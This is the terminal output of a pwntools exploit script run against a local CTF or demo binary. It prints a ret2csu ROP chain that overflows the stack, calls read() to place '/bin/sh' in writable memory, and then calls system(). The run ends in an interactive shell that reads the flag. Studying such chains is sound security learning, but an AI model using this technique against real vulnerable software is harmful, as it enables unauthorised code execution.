```
python3 pwn-ret2csu.py BIN=./chal.bin
[*] '/demos/ret2csu-demo/chal.bin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loading gadgets for '/demos/ret2csu-demo/chal.bin'
[+] Starting local process '/demos/ret2csu-demo/chal.bin': pid 4354
[*] Sending Ret2CSU Chain
[*] Sending 
    chain = cyclic(16)              # padding for overflow
    chain += p64(0x40071a)          # first gadget
    chain += p64(0x0)
    chain += p64(0x1)
    chain += p64(read)              # r12 = e.got['read']->read()
    chain += p64(0x0)               # rdi = stdin = 0x0
    chain += p64(writeable_mem)     # rsi = writable_mem
    chain += p64(0x8)               # rdx = 0x8
    chain += p64(0x400700)          # second gadget
    chain += cyclic(8)*7            # padding for after call
    
    chain += p64(pop_rdi)           # pop rdi; ret
    chain += p64(writeable_mem)     # rdi = writeable_mem -> '/bin/sh'
    chain += p64(system)            # system('/bin/sh')
[*] Hit [Enter] to Send '/bin/sh\x00'
[*] Paused (press any to continue)
[*] Here is your shell >>> 
[*] Switching to interactive mode
$ cat flag.txt
flag{i_sure_wished_this_worked_remotely_too}
```